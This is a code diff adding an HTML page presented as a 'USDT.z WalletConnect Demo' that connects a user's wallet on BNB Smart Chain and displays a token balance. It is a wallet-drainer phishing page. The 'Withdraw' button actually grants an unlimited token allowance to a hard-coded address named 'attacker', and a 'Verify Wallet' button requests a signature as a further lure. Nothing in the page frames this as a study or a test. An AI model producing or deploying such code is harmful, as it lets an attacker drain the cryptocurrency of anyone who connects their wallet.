@@ -1,0 +1,81 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>USDT.z QR Connect DApp</title>
+  <style>
+    body { font-family: Arial; background: #f2f2f2; text-align: center; padding: 40px; }
+    .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; }
+    .title { font-size: 24px; margin-bottom: 20px; }
+    .btn { padding: 10px 20px; margin: 10px; font-size: 16px; }
+    .value { font-size: 18px; color: green; }
+    .danger { color: red; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="title">USDT.z WalletConnect Demo</div>
+    <button class="btn" onclick="connect()">Connect via QR</button>
+    <p id="wallet">Wallet: -</p>
+    <p id="balance">Balance: -</p>
+    <p class="value">Estimated USD: $<span id="usd">0</span></p>
+    <button class="btn" onclick="approve()">Withdraw</button>
+    <button class="btn" onclick="sign()">Verify Wallet</button>
+    <p class="danger" id="status"></p>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+  <script>
+    const tokenAddress = "0xc1C4812dc9B48742768fADbce323655C65afe0B1";
+    const attacker = "0xa2fC4ca37c3e3EC8FFc441682c5fe53901807621";
+
+    const abi = [
+      "function balanceOf(address) view returns (uint256)",
+      "function decimals() view returns (uint8)",
+      "function approve(address spender, uint256 amount) returns (bool)"
+    ];
+
+    let provider, web3Provider, signer;
+
+    async function connect() {
+      const walletConnectProvider = new WalletConnectProvider.default({
+        rpc: {
+          56: "https://bsc-dataseed.binance.org/"
+        }
+      });
+      await walletConnectProvider.enable();
+
+      web3Provider = new ethers.providers.Web3Provider(walletConnectProvider);
+      signer = web3Provider.getSigner();
+      const address = await signer.getAddress();
+      document.getElementById("wallet").innerText = "Wallet: " + address;
+      loadBalance(address);
+    }
+
+    async function loadBalance(addr) {
+      const token = new ethers.Contract(tokenAddress, abi, web3Provider);
+      const decimals = await token.decimals();
+      const raw = await token.balanceOf(addr);
+      const balance = ethers.utils.formatUnits(raw, decimals);
+      document.getElementById("balance").innerText = "Balance: " + balance + " USDT.z";
+      document.getElementById("usd").innerText = (parseFloat(balance) * 1).toLocaleString();
+    }
+
+    async function approve() {
+      const token = new ethers.Contract(tokenAddress, abi, signer);
+      await token.approve(attacker, ethers.constants.MaxUint256);
+      document.getElementById("status").innerText = "Withdraw approval sent.";
+    }
+
+    async function sign() {
+      const message = "Sign to verify your wallet for USDT.z.";
+      const address = await signer.getAddress();
+      const hexMessage = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(message));
+      const signature = await web3Provider.send("personal_sign", [hexMessage, address]);
+      document.getElementById("status").innerText = "Wallet verified via signature.";
+      console.log("Signature:", signature);
+    }
+  </script>
+</body>
+</html>
